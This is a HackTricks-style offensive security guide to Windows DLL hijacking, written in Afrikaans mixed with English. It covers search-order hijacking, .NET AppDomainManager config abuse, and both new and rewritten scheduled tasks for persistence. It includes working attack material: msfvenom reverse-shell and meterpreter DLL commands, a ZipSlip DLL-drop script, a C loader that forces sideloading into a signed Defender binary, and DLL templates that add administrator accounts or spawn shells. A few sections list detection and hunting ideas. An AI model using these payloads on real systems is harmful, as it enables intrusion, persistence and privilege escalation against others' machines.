# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulering van ’n vertroude toepassing sodat dit ’n kwaadwillige DLL laai. Hierdie term omvat verskeie taktieke soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, persistence en, minder algemeen, privilege escalation. Ondanks die fokus op escalation hier, bly die metode van hijacking dieselfde ongeag die doelwit.

### Algemene Tegnieke

Verskeie metodes word vir DLL hijacking gebruik, en die doeltreffendheid van elkeen hang af van die toepassing se DLL-laaistrategie:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Vervanging van ’n egte DLL met ’n kwaadwillige een, opsioneel met behulp van DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plasing van die kwaadwillige DLL in ’n search path voor die legitieme een, deur die toepassing se search pattern uit te buit.
3. **Phantom DLL Hijacking**: Skep van ’n kwaadwillige DLL wat ’n toepassing moet laai, omdat dit dink dit is ’n nie-bestaande vereiste DLL.
4. **DLL Redirection**: Wysiging van search parameters soos `%PATH%` of `.exe.manifest` / `.exe.local`-lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervanging van die legitieme DLL met ’n kwaadwillige ekwivalent in die WinSxS-gids, ’n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plasing van die kwaadwillige DLL in ’n user-controlled gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution-tegnieke.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassieke DLL sideloading is nie die enigste manier om ’n vertroude **.NET Framework**-proses attacker code te laat laai nie. As die teikenuitvoerbare lêer ’n **managed** toepassing is, raadpleeg die CLR ook ’n **application configuration file** wat na die uitvoerbare lêer vernoem is (byvoorbeeld `Setup.exe.config`). Daardie lêer kan ’n custom **AppDomainManager** definieer. As die config na ’n attacker-controlled assembly langs die EXE wys, laai die CLR dit **voor die toepassing se normale code path** en voer dit binne die vertroude proses uit.<sup>[[24]](#references)</sup>

Volgens Microsoft se .NET Framework configuration schema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees voordat die custom manager gebruik word.<sup>[[16]](#references)[[17]](#references)</sup>

Minimale config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimale bestuurder:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktiese notas:
- Hierdie is **.NET Framework-spesifieke** tradecraft. Dit maak staat op CLR-konfigurasie-ontleding, nie op die Win32 DLL-soekvolgorde nie.
- Die host moet werklik ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in PE-metadata.
- Die konfigurasielêernaam moet presies met die executable se naam ooreenstem (`<binary>.config`) en gewoonlik **langs die EXE** geleë wees.
- Dit is nuttig met **signed Microsoft/vendor binaries**, omdat die trusted EXE onaangeraak bly terwyl die malicious managed assembly in-process uitgevoer word.
- As jy reeds ’n skryfbare installer/update-gids het, kan AppDomainManager hijacking as die **eerste stage** gebruik word, gevolg deur klassieke DLL sideloading of reflective loading vir latere stages.

### AppDomainManager as ’n downloader + bootstrap vir ’n geskeduleerde taak

’n Praktiese intrusion-patroon is om die trusted managed EXE met beide ’n malicious `*.config` en ’n malicious AppDomainManager DLL te kombineer wat slegs as ’n **klein bootstrapper** optree:<sup>[[25]](#references)</sup>

1. Die gebruiker begin ’n signed .NET-installeerder of updater vanaf ’n geloofwaardige ligging soos `%USERPROFILE%\Downloads`.
2. Die aangrensende konfigurasie veroorsaak dat die CLR die attacker assembly laai **voordat** die legitimate app-logika begin.
3. Die malicious manager voer ’n **path gate** uit (gaan byvoorbeeld slegs voort as die host EXE vanaf `Downloads` uitgevoer word, en laat die second stage slegs vanaf `%LOCALAPPDATA%` loop).
4. As die kontrole slaag, download dit die real payload na ’n user-writable path soos `%LOCALAPPDATA%\PerfWatson2.exe` en vestig persistence met ’n geskeduleerde taak.

Waarom hierdie variant belangrik is:
- Die signed host EXE bly onveranderd, dus kan triage wat slegs die hoofbinary se hashes nagaan, die compromise mis.
- Eenvoudige **path-based anti-analysis** is algemeen: om die ZIP/EXE/DLL-trio na Desktop, Temp of ’n sandbox path te verskuif, kan die chain doelbewus breek.
- Die eerste-stage AppDomainManager DLL kan klein en low-noise bly terwyl die real implant later gefetch word.

Minimale persistence-voorbeeld wat gereeld met hierdie patroon gesien word:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notas:
- ` /rl highest` beteken **highest available** vir daardie gebruiker/sessie; dit is nie op sigself ’n gewaarborgde SYSTEM-escalation nie.
- Hierdie tegniek word dikwels beter gekategoriseer as **execution/persistence via .NET config abuse** eerder as klassieke missing-DLL search-order hijacking, hoewel operators dikwels albei saam gebruik.

Opsporingsfokuspunte:
- Signed .NET executables wat vanaf **ZIP extraction paths**, `Downloads`, `%TEMP%`, of ander gebruiker-skryfbare vouers geloods word, met ’n **colocated** `<exe>.config`.
- Nuwe scheduled tasks waarvan die action na `%LOCALAPPDATA%`, `%APPDATA%`, of `Downloads` wys, en waarvan die name soos browser/vendor updaters lyk.
- Kortstondige managed bootstrap processes wat onmiddellik ’n ander EXE aflaai en daarna `schtasks.exe` spawn.
- Samples wat vroeg exit tensy die executable path met ’n verwagte user-profile directory ooreenstem.

### Hijacking van ’n bestaande scheduled task om die sideload chain te herlaai

Vir persistence, moenie net kyk vir **creating a new task** nie. Sommige intrusion sets wag totdat ’n legitimate installer ’n **normal updater task** skep en **rewrite dan die task action** sodat die bestaande naam, outeur en trigger vir defenders bekend bly.

Herbruikbare workflow:
1. Installeer/run die legitimate software en identifiseer die task wat dit normaalweg skep.
2. Export die task XML en let op die huidige `<Exec><Command>` / `<Arguments>`-waardes.<sup>[[23]](#references)</sup>
3. Replace slegs die action sodat die task jou **trusted host EXE** vanaf ’n gebruiker-skryfbare staging directory start, wat dan die werklike payload sideload of AppDomain-load.
4. Re-register dieselfde task name in plaas daarvan om ’n nuwe, ooglopende persistence artifact te skep.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Waarom dit meer stealthy is:
- Die task name kan steeds legitiem lyk (byvoorbeeld ’n vendor updater).
- Die **Task Scheduler service** begin dit, dus sien parent/ancestor validation dikwels die verwagte scheduling chain in plaas van `explorer.exe`.
- DFIR-spanne wat slegs jag op **nuwe task names** kan ’n task miskyk waarvan die registration reeds bestaan het, maar waarvan die action nou na `%LOCALAPPDATA%`, `%APPDATA%`, of ’n ander attacker-controlled path wys.

Vinnige hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk `C:\Windows\System32\Tasks\*` XML en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata met ’n baseline.
- Genereer ’n alert wanneer ’n **vendor-looking updater task** vanaf **user-writable directories** uitvoer of ’n .NET EXE met ’n colocated `*.config`-lêer begin.

> [!TIP]
> Vir ’n stap-vir-stap chain wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading plaas, hersien die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Ontdekking van ontbrekende DLLs

Die algemeenste manier om ontbrekende DLLs binne ’n system te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te run en die **volgende 2 filters** te **stel**:

![Common Techniques - Finding missing Dlls: Die algemeenste manier om ontbrekende DLLs binne ’n system te vind, is om procmon vanaf sysinternals te run en die volgende 2 filters te stel](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: Die algemeenste manier om ontbrekende DLLs binne ’n system te vind, is om procmon vanaf sysinternals te run en die volgende 2 filters te stel](<../../../images/image (230).png>)

en wys slegs die **File System Activity**:

![Common Techniques - Finding missing Dlls: en wys slegs die File System Activity](<../../../images/image (153).png>)

As jy op soek is na **ontbrekende DLLs in die algemeen**, **laat** jy dit vir ’n paar **sekondes** run.\
As jy op soek is na ’n **ontbrekende DLL binne ’n spesifieke executable**, stel nog ’n filter, soos **"Process Name" "contains" `<exec name>`**, execute dit, en stop die capturing van events.<sup>[[9]](#references)</sup>

## Exploiting van ontbrekende DLLs

Om privileges te eskaleer, soek ’n **DLL wat ’n privileged process probeer laai** vanaf ’n location waarna jy kan write. Dit kan gebeur wanneer jy ’n directory beheer wat voor die directory met die legitimate DLL gesoek word, of wanneer die requested DLL nie bestaan nie en jy na een van die searched directories kan write.

### DLL Search Order

**In die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die DLLs spesifiek gelaai word.**

**Windows applications** soek DLLs deur ’n stel **pre-defined search paths** te volg, volgens ’n spesifieke volgorde. Die probleem van DLL hijacking ontstaan wanneer ’n harmful DLL strategies in een van hierdie directories geplaas word, sodat dit voor die authentic DLL gelaai word. ’n Oplossing hiervoor is om seker te maak dat die application absolute paths gebruik wanneer daar na die DLLs wat dit benodig, verwys word.

Jy kan die **DLL search order op 32-bit** systems hieronder sien:

1. Die directory waarvandaan die application gelaai is.
2. Die system directory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-function om die path van hierdie directory te kry.(_C:\Windows\System32_)
3. Die 16-bit system directory. Daar is geen function wat die path van hierdie directory verkry nie, maar dit word gesoek. (_C:\Windows\System_)
4. Die Windows directory. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-function om die path van hierdie directory te kry.
1. (_C:\Windows_)
5. Die current directory.
6. Die directories wat in die PATH environment variable gelys word. Let daarop dat dit nie die per-application path insluit wat deur die **App Paths** registry key gespesifiseer word nie. Die **App Paths**-key word nie gebruik wanneer die DLL search path bereken word nie.

Dit is die **default** search order met **SafeDllSearchMode** enabled. Wanneer dit disabled is, skuif die current directory na die tweede plek. Om hierdie feature te disable, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value en stel dit op 0 (default is enabled).

As die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-function met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die search in die directory van die executable module wat **LoadLibraryEx** laai.

Laastens kan ’n DLL met ’n absolute path eerder as volgens naam gelaai word. In daardie geval kyk Windows slegs na daardie path vir die DLL self; dependencies wat volgens naam requested word, volg steeds die toepaslike search order.

Daar is ander maniere om die search order te verander, maar ek gaan dit nie hier verduidelik nie.

### Chaining van ’n arbitrary file write in ’n missing-DLL hijack

1. Gebruik **ProcMon**-filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) om DLL names te versamel wat die process probe, maar nie kan vind nie.<sup>[[14]](#references)</sup>
2. As die binary op ’n **schedule/service** run, sal ’n DLL met een van daardie names in die **application directory** (search-order entry #1) op die volgende execution gelaai word. In een .NET scanner-case het die process gesoek na `hostfxr.dll` in `C:\samples\app\` voordat dit die real copy vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload DLL (byvoorbeeld reverse shell) met enige export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-style arbitrary write** is, skep ’n ZIP waarvan die entry uit die extraction dir ontsnap sodat die DLL in die app folder land:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief by die gemonitorde inbox/share; wanneer die geskeduleerde taak die proses herbegin, laai dit die malicious DLL en voer jou kode as die diensrekening uit.

### Dwing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses met ntdll se native APIs geskep word. Deur ’n aanvallerbeheerde gids hier te verskaf, kan ’n teikenproses wat ’n imported DLL volgens naam resolve (geen absolute path nie en wat nie die safe loading flags gebruik nie), gedwing word om ’n malicious DLL vanaf daardie gids te laai.

Sleutelidee
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf ’n custom DllPath wat na jou beheerde folder wys (byvoorbeeld die gids waar jou dropper/unpacker geleë is).
- Skep die proses met RtlCreateUserProcess. Wanneer die teikenbinary ’n DLL volgens naam resolve, sal die loader hierdie verskafde DllPath tydens resolution raadpleeg, wat betroubare sideloading moontlik maak selfs wanneer die malicious DLL nie saam met die teiken-EXE geleë is nie.

Notas/beperkings
- Dit beïnvloed die child process wat geskep word; dit verskil van SetDllDirectory, wat slegs die current process beïnvloed.
- Die teiken moet ’n DLL volgens naam import of met LoadLibrary laai (geen absolute path nie en nie met LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories nie).
- KnownDLLs en hardcoded absolute paths kan nie gehijack word nie. Forwarded exports en SxS kan die precedence verander.

Minimale C-voorbeeld (ntdll, wide strings, vereenvoudigde error handling):

<details>
<summary>Volledige C-voorbeeld: dwing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Voorbeeld van operasionele gebruik
- Plaas ’n malicious xmllite.dll (wat die vereiste functions export of na die werklike een proxy) in jou DllPath-directory.
- Launch ’n signed binary wat bekend is daarvoor dat dit xmllite.dll volgens naam opsoek deur die bogenoemde technique te gebruik. Die loader resolve die import via die verskafde DllPath en sideload jou DLL.

Hierdie technique is in-the-wild waargeneem om multi-stage sideloading chains aan te dryf: ’n aanvanklike launcher drop ’n helper DLL, wat dan ’n Microsoft-signed, hijackable binary spawn met ’n custom DllPath om loading van die attacker se DLL vanuit ’n staging directory af te dwing.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

Vir **.NET Framework**-targets kan sideloading **voor `Main()`** gedoen word sonder om memory te patch deur die toepassing se aangrensende **`.exe.config`**-file te abuse. In plaas daarvan om slegs op die Win32 DLL search order staat te maak, plaas die attacker ’n legitimate .NET EXE langs ’n malicious config en een of meer attacker-controlled assemblies.

Hoe die chain werk:<sup>[[15]](#references)[[22]](#references)</sup>
1. Die host EXE start en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** sodat die runtime ’n attacker-controlled `AppDomainManager` instansieer.
3. Die malicious manager kry **pre-`Main()` execution** binne die trusted host process.
4. Dieselfde config kan die CLR dwing om eers local assemblies te resolve (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en kan runtime validation/telemetry verswak sonder inline patching.

Campaign-style pattern (presiese nesting kan volgens directive / CLR version wissel):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Waarom dit nuttig is:
- **`<probing privatePath="."/>`** hou assembly-resolusie in die toepassingsgids, wat die gids in ’n voorspelbare sideloading-oppervlak verander.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** verskuif uitvoering na aanvallerkode tydens CLR-inisialisering, voordat die wettige toepassinglogika loop.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan ’n full-trust-toepassing toelaat om unsigned of gewysigde assemblies te laai sonder ’n strong-name-valideringsfout.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** vermy publisher-policy-herleidings na nuwer assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** maak runtime-seleksie meer deterministies.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** is besonder interessant omdat die **CLR sy eie ETW-sigbaarheid** vanuit die konfigurasie deaktiveer, eerder as dat die implant `EtwEventWrite` in geheue patch.

Operasionele patroon wat in onlangse veldtogte waargeneem is:
- Fase 1 plaas `setup.exe`, `setup.exe.config` en plaaslike assemblies.
- Fase 2 kopieer dit na ’n geloofwaardige **AppData update**-gids, hernoem die host na iets soos `update.exe`, en begin dit weer via ’n **scheduled task**.
- Fase 3 verifieer die uitvoeringskonteks (byvoorbeeld die verwagte ouerproses `svchost.exe` vanaf Task Scheduler) voordat die finale RAT DLL/export gelaai word.

Hunting-idees:
- Getekende of andersins wettige **.NET executables** wat loop met verdagte aangrensende **`.config`**-lêers in gebruiker-skryfbare liggings.
- `.config`-lêers wat **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** of **`etwEnable enabled="false"`** bevat.
- Scheduled tasks wat hernoemde update-binaries vanaf **`%LOCALAPPDATA%`** of toepassing-spesifieke `\bin\update\`-gidse herbegin.
- Ouer-/kind-kettings waar ’n scheduled task ’n vertroude .NET host begin wat onmiddellik nie-verskaffer-assemblies uit sy eie gids laai.

#### Uitsonderings op DLL-soekvolgorde volgens Windows-dokumentasie

Sekere uitsonderings op die standaard DLL-soekvolgorde word in Windows-dokumentasie aangedui:

- Wanneer ’n **DLL wat dieselfde naam as een wat reeds in geheue gelaai is** teëgekom word, omseil die stelsel die gewone soektog. In plaas daarvan kontroleer dit herleiding en ’n manifest voordat dit na die DLL wat reeds in geheue is, terugval. **In hierdie scenario doen die stelsel nie ’n soektog na die DLL nie**.
- Wanneer die DLL as ’n **bekende DLL** vir die huidige Windows-weergawe herken word, gebruik die stelsel sy weergawe van die bekende DLL, saam met enige afhanklike DLLs, **sonder om die soekproses uit te voer**. Die registersleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat ’n lys van hierdie bekende DLLs.
- Indien ’n **DLL afhanklikhede het**, word die soektog na hierdie afhanklike DLLs uitgevoer asof hulle slegs deur hul **module name** aangedui is, ongeag of die aanvanklike DLL deur middel van ’n volledige pad geïdentifiseer is.

### Eskalering van Privileges

**Vereistes**:

- Identifiseer ’n proses wat onder **verskillende privileges** (horisontale of laterale beweging) werk of sal werk en wat ’n **DLL** kort.
- Maak seker **skryftoegang** is beskikbaar vir enige **gids** waarin die **DLL** gesoek sal word. Hierdie ligging kan die gids van die executable of ’n gids binne die stelselpad wees.

Hierdie voorvereistes is by verstek ongewoon: geprivilegieerde executables het gewoonlik nie ontbrekende DLL-afhanklikhede nie, en standaardgebruikers kan normaalweg nie na stelsel-soekpadgidse skryf nie. Verkeerd gekonfigureerde omgewings kan steeds albei toestande blootstel.\
Indien aan die vereistes voldoen word, kyk na die [UACME](https://github.com/hfiref0x/UACME)-projek. Hoewel die hoofdoel daarvan UAC bypass is, bevat dit DLL-hijacking PoCs vir spesifieke Windows-weergawes wat dikwels aangepas kan word vir die skryfbare gids wat jy gevind het.

Let daarop dat jy jou **toestemmings in ’n gids kan nagaan** deur:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die toestemmings van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van ’n executable en die exports van ’n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir ’n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te eskaleer** met toestemmings om in ’n **System Path-lêer** te skryf, kyk na:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Geoutomatiseerde tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryftoestemmings op enige lêer binne die system PATH het.\
Ander interessante geoutomatiseerde tools om hierdie kwesbaarheid te ontdek, is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Voorbeeld

Indien jy ’n uitbuitbare scenario vind, sal een van die belangrikste dinge om dit suksesvol uit te buit wees om **’n dll te skep wat ten minste al die functions uitvoer wat die executable daaruit sal import**. Let egter daarop dat Dll Hijacking handig is om van **Medium Integrity-vlak na High (UAC te omseil)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity na SYSTEM**](../index.html#from-high-integrity-to-system)** te eskaleer. Jy kan ’n voorbeeld kry van **hoe om ’n geldige dll te skep** binne hierdie dll hijacking-studie wat op dll hijacking vir uitvoering fokus: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder kan jy in die **volgende afdelin**g ’n paar **basiese dll-kodes** vind wat nuttig kan wees as **templates** of om ’n **dll met nie-verpligte functions wat uitgevoer word** te skep.

## **Skep en kompileer Dlls**

### **Dll Proxifying**

Basies is ’n **Dll proxy** ’n Dll wat in staat is om **jou kwaadwillige kode uit te voer wanneer dit gelaai word**, maar ook om **bloot te stel** en **te werk** soos **verwag** deur alle oproepe na die werklike library te **relê**.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy werklik **’n executable aandui en die library kies** wat jy wil proxify en **’n proxified dll genereer**, of **die Dll aandui** en **’n proxified dll genereer**.

### **Meterpreter**

**Kry rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

In baie gevalle moet die DLL wat jy saamstel **elke funksie uitvoer wat deur die slagofferproses ingevoer word**. As ’n vereiste uitvoer ontbreek, kan die binêre lêer dit nie oplos nie en misluk die exploit.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-voorbeeld met gebruikerskepping</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread-ingang</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds tydens opstart 'n voorspelbare, taalspesifieke localization DLL wat vir arbitrary code execution en persistence gehijack kan word.<sup>[[7]](#references)</sup>

Sleutelfeite
- Probe path (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Indien 'n writable attacker-controlled DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` word uitgevoer. Geen exports word vereis nie.

Discovery met Procmon
- Filter: `Process Name is Narrator.exe` en `Operation is Load Image` of `CreateFile`.
- Begin Narrator en neem die poging waar om die bogenoemde path te laai.

Minimale DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC-stilte
